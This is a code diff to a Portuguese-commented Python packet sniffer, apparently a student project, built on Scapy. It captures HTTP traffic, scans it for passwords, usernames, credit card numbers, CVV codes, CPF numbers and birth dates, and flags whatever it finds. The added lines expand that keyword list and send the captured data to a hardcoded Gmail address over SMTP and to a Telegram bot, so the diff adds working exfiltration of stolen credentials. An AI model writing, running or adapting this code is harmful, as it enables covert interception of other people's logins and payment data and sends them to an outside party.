@@ -1,9 +1,17 @@
+import os
+import smtplib
+import requests
 from scapy.all import *  # Importa todas as funcionalidades do Scapy
 from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse  # Importa classes específicas relacionadas ao protocolo HTTP do Scapy
 from urllib import parse  # Importa o módulo parse do urllib para manipulação de URLs
-import os  # Importa o módulo os para funcionalidades relacionadas ao sistema operacional
 import tkinter as tk  # Importa a biblioteca tkinter para criar interfaces gráficas
 from tkinter import messagebox, scrolledtext  # Importa classes específicas do tkinter para caixas de mensagem e áreas de texto
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from dotenv import load_dotenv
+
+# Carregar variáveis de ambiente do arquivo .env
+load_dotenv()
 
 # Defina a interface de rede a ser usada para captura
 interface = "wlp4s0"
@@ -13,15 +21,17 @@ def filter_HTTP(pkt):
     return pkt.haslayer(HTTPRequest) or pkt.haslayer(HTTPResponse)
 
 # Conjunto de dados sensíveis a serem procurados nos pacotes capturados
-SENSITIVE_DATA = {  # Define um conjunto de palavras-chave que representam dados sensíveis
-    "username", "user", "nome", "user name", "fname",  # Dados de nome de usuário
-    "password", "pass", "pwd", "passwd", "senha",  # Dados de senha
-    "cc", "credit card", "card number", "card num", "creditcard",  # Dados de cartão de crédito
-    "cvv", "cvc", "security code", "sec code", "cvv code",  # Dados de código de segurança do cartão de crédito
-    "cpf", "CPF", "C.P.F.",  # Dados de CPF
-    "email", "e-mail", "mail",  # Dados de e-mail
-    "birth date", "birthdate", "date of birth", "bday", "birth day", "data de nasc",  # Dados de data de nascimento
-    "aniversario",  # Dados de aniversário
+SENSITIVE_DATA = {
+    "username", "user", "nome", "user name", "fname", "lname", "sobrenome",
+    "middleName","lastName","initials","gender","sex","initials","mailingAddress",
+    "password", "pass", "pwd", "passwd", "senha","country","pais",
+    "login", "phone", "telefone", "celphone", "celular",
+    "cc", "credit card", "card number", "card num", "creditcard",
+    "cvv", "cvc", "security code", "sec code", "cvv code",
+    "cpf", "CPF", "C.P.F.",
+    "email", "e-mail", "mail",
+    "birth date", "birthdate", "date of birth", "bday", "birth day", "data de nasc",
+    "aniversario",
 }
 
 # Diretório para salvar a captura de pacotes
@@ -57,6 +67,45 @@ def show_popup(message):
 
     popup.mainloop()  # Inicia o loop principal da janela pop-up
 
+# Função para enviar um e-mail
+def send_email(subject, body, to_email):
+    from_email = os.getenv('EMAIL_ADDRESS')
+    password = os.getenv('EMAIL_PASSWORD')
+
+    msg = MIMEMultipart()
+    msg['From'] = from_email
+    msg['To'] = to_email
+    msg['Subject'] = subject
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(from_email, password)
+        text = msg.as_string()
+        server.sendmail(from_email, to_email, text)
+        server.quit()
+        print("Email enviado com sucesso!")
+    except Exception as e:
+        print(f"Erro ao enviar email: {str(e)}")
+
+# Função para enviar uma mensagem pelo Telegram
+def send_telegram_message(message):
+    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
+    chat_id = os.getenv('TELEGRAM_CHAT_ID')
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    data = {'chat_id': chat_id, 'text': message}
+
+    try:
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
+            print("Mensagem enviada pelo Telegram com sucesso!")
+        else:
+            print(f"Falha ao enviar mensagem pelo Telegram: {response.status_code}")
+    except Exception as e:
+        print(f"Erro ao enviar mensagem pelo Telegram: {str(e)}")
+
 print("Captura iniciada...")
 
 # Captura pacotes da interface especificada, filtrando aqueles relacionados ao protocolo HTTP
@@ -68,7 +117,7 @@ all_sensitive_data_found = []
 # Itera sobre os pacotes capturados
 for pkt in packets:
     print("-" * 40)
-    print("**Pacote capturado:**")
+    print("*Pacote capturado:*")
     url = ""
     method = ""
     local_sensitive_data_found = []
@@ -127,10 +176,12 @@ if all_sensitive_data_found:  # Se foram encontrados dados sensíveis em qualque
         final_message += "\n"  # Adiciona uma linha em branco
 
     show_popup(final_message)  # Exibe uma janela pop-up com a mensagem final
+    send_email("Dados Sensíveis Capturados", final_message, "sniffertuiuti@gmail.com")  # Envia um e-mail com os dados sensíveis
+    send_telegram_message(final_message)  # Envia uma mensagem pelo Telegram com os dados sensíveis
 else:  # Se nenhum dado sensível foi capturado
     show_popup("Nenhum dado sensível capturado.")  # Exibe uma janela pop-up informando que nenhum dado sensível foi capturado
 
-print("**Captura finalizada!**")  # Imprime uma mensagem indicando que a captura foi finalizada
+print("*Captura finalizada!*")  # Imprime uma mensagem indicando que a captura foi finalizada
 
 # Salvar a captura completa dos pacotes em um arquivo pcap
 filename = "captura_completa.pcap"  # Nome do arquivo de captura
